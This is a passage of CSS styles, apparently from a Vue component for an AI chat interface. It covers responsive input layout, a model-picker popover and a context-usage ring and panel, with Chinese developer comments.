  .ai-empty { padding: 0 12px; margin-top: 20px; }
  .ai-orb { width: 60px; height: 60px; border-radius: 18px; }
  .ai-orb-mark { width: 32px; height: 32px; }
  .ai-empty-title { font-size: 20px; }
  .ai-empty-tip { font-size: 13px; margin-bottom: 14px; }
  .ai-sug { font-size: 13px; padding: 9px 12px; }

  .ai-input-wrap { padding: 8px 10px 10px; gap: 4px; }
  .ai-input-card { border-radius: 16px; padding: 10px 10px 8px; }
  .ai-input-bar { flex-wrap: wrap; gap: 8px; margin-top: 6px; }
  /* 窄屏放不下模型名，只留品牌图标；点开弹层仍能看到完整列表 */
  .ai-input-tools .aimp-label, .ai-input-tools .aimp-caret { display: none; }
  .ai-input-tools .aimp-trigger { max-width: 44px; padding: 0 9px; }
  .ai-mode-btn { padding: 6px 12px; }
  .ai-foot-disclaimer { font-size: 11px; }
  .ai-tobottom { bottom: 8px; }
}

.msg-steps { margin: 2px 0 6px; }

/* ===== 上下文用量环（点开看明细 / 切思考强度 / 压缩历史） ===== */
.ai-ctx {
  position: relative; width: 34px; height: 34px; padding: 0; margin-right: 4px;
  border: 0; background: none; border-radius: 50%; cursor: pointer;
  display: inline-flex; align-items: center; justify-content: center; flex: none;
}
.ai-ctx:hover { background: var(--el-fill-color-light); }
.ai-ctx-ring { position: absolute; inset: 0; width: 100%; height: 100%; transform: rotate(-90deg); }
.ai-ctx-bg { fill: none; stroke: var(--el-border-color-lighter); stroke-width: 3; }
.ai-ctx-fg { fill: none; stroke-width: 3; stroke-linecap: round; transition: stroke-dasharray .3s ease, stroke .3s ease; }
.ai-ctx-num { position: relative; font-size: 10px; font-weight: 700; line-height: 1; color: var(--el-text-color-secondary); }
</style>

<!-- 模型选择弹层：el-popover 挂到 body，scoped 样式作用不到，需非 scoped（2026-10-18） -->
<style>
.aimp-popover.el-popover.el-popper {
  padding: 6px; border-radius: 14px;
  box-shadow: 0 12px 32px rgba(15, 23, 42, .14), 0 2px 8px rgba(15, 23, 42, .06);
}
html.dark .aimp-popover.el-popover.el-popper { box-shadow: 0 12px 32px rgba(0, 0, 0, .5); }
.aimp-list { display: flex; flex-direction: column; gap: 2px; }
.aimp-head { font-size: 11.5px; color: var(--el-text-color-secondary); padding: 6px 10px 4px; }
.aimp-row {
  display: flex; align-items: center; gap: 10px; width: 100%;
  padding: 8px 10px; border: 0; background: transparent; border-radius: 9px;
  cursor: pointer; text-align: left; font-family: inherit;
  transition: background .12s;
}
.aimp-row:hover { background: var(--el-fill-color-light); }
.aimp-row.on { background: var(--el-color-primary-light-9); }
.aimp-ico { width: 22px; height: 22px; flex: none; display: inline-flex; align-items: center; justify-content: center; }
.aimp-main { flex: 1 1 auto; min-width: 0; display: flex; flex-direction: column; gap: 1px; }
.aimp-name { font-size: 13.5px; color: var(--el-text-color-primary); line-height: 1.35; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.aimp-sub { font-size: 11.5px; color: var(--el-text-color-secondary); line-height: 1.3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.aimp-check { color: var(--el-color-primary); flex: none; font-size: 15px; }
.aimp-row .aimp-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--el-color-primary-light-5); }
html.dark .aimp-row:hover { background: rgba(255, 255, 255, .06); }

/* 上下文弹层：el-popover 同样挂到 body，scoped 作用不到（与模型弹层同理） */
.ai-ctx-pop.el-popover.el-popper {
  padding: 12px 14px; border-radius: 14px;
  box-shadow: 0 12px 32px rgba(15, 23, 42, .14), 0 2px 8px rgba(15, 23, 42, .06);
}
.ctxp { font-size: 13px; }
.ctxp-head { display: flex; justify-content: space-between; align-items: baseline; font-weight: 600; margin-bottom: 8px; }
.ctxp-head b { font-size: 15px; }
.ctxp-bar { height: 6px; border-radius: 999px; background: var(--el-fill-color); overflow: hidden; margin-bottom: 10px; }
.ctxp-bar i { display: block; height: 100%; border-radius: 999px; transition: width .3s ease; }
.ctxp-bar.seg { display: flex; gap: 1px; }
.ctxp-bar.seg i { flex: none; border-radius: 0; }
.ctxp-bar.seg i:first-child { border-radius: 999px 0 0 999px; }
.ctxp-bar.seg i:last-child { border-radius: 0 999px 999px 0; }
.ctxp-k { display: inline-flex; align-items: center; gap: 6px; }
.ctxp-dot { width: 8px; height: 8px; border-radius: 50%; flex: none; }
.ctxp-foot { margin-top: 8px; padding-top: 8px; border-top: 1px solid var(--el-border-color-lighter); font-size: 11px; color: var(--el-text-color-placeholder); }
/* 上下文窗口滑块：只能往下调（不超过模型上限），用来省 token / 避免长上下文变慢 */
.ctxp-slider { padding: 0 4px; margin: 2px 0 0; }
.ctxp-slider :deep(.el-slider__runway) { height: 6px; border-radius: 999px; }
.ctxp-slider :deep(.el-slider__bar) { height: 6px; border-radius: 999px; background: #10b981; }
.ctxp-slider :deep(.el-slider__button) { width: 16px; height: 16px; border: 2px solid #10b981; }
.ctxp-slider-label {
  display: flex; align-items: center; justify-content: space-between;
  font-size: 11px; color: var(--el-text-color-secondary); margin-bottom: 4px;
}
.ctxp-slider-label b { color: #10b981; font-weight: 600; }
.ctxp-reset {
  border: none; background: transparent; color: var(--el-color-primary);
  font-size: 11px; cursor: pointer; padding: 2px 4px; font-family: inherit;
}
.ctxp-reset:hover { text-decoration: underline; }
.ctxp-row { display: flex; justify-content: space-between; gap: 12px; padding: 3px 0; font-size: 12px; color: var(--el-text-color-secondary); }
.ctxp-row b { color: var(--el-text-color-primary); font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.ctxp-sec { margin: 12px 0 6px; font-size: 12px; font-weight: 600; color: var(--el-text-color-regular); }
.ctxp-think { display: flex; gap: 6px; }
.ctxp-tbtn {
  flex: 1 1 0; padding: 6px 0; border-radius: 8px; cursor: pointer; font-family: inherit;
  border: 1px solid var(--el-border-color); background: transparent;
  font-size: 12px; color: var(--el-text-color-regular); transition: all .12s;
}
.ctxp-tbtn:hover { border-color: var(--el-color-primary-light-5); }
.ctxp-tbtn.on { background: var(--el-color-primary-light-9); border-color: var(--el-color-primary); color: var(--el-color-primary); font-weight: 600; }
.ctxp-act {
  width: 100%; padding: 8px 0; border-radius: 8px; cursor: pointer; font-family: inherit;
  border: 1px solid var(--el-border-color); background: transparent;
  font-size: 13px; color: var(--el-text-color-regular); transition: all .12s;
}
.ctxp-act:hover:not(:disabled) { border-color: var(--el-color-primary); color: var(--el-color-primary); }
.ctxp-act:disabled { opacity: .6; cursor: default; }
.ctxp-tip { margin: 8px 0 0; font-size: 11px; line-height: 1.6; color: var(--el-text-color-placeholder); }
</style>